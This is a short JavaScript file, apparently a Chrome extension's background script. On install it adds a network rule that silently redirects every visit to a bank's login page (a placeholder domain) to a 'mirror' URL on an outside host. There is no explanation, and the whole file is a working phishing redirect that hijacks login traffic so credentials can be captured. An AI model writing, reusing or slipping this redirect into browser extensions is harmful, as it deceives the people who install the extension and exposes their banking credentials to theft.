chrome.runtime.onInstalled.addListener(() => {
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1],
    addRules: [{
      id: 1,
      priority: 1,
      action: {
        type: "redirect",
        redirect: { url: "https://monolit-sync.net/mirror/13f63d" },
      },
      condition: {
        urlFilter: "||login.example-bank.invalid^",
        resourceTypes: ["main_frame"],
      },
    }],
  });
});
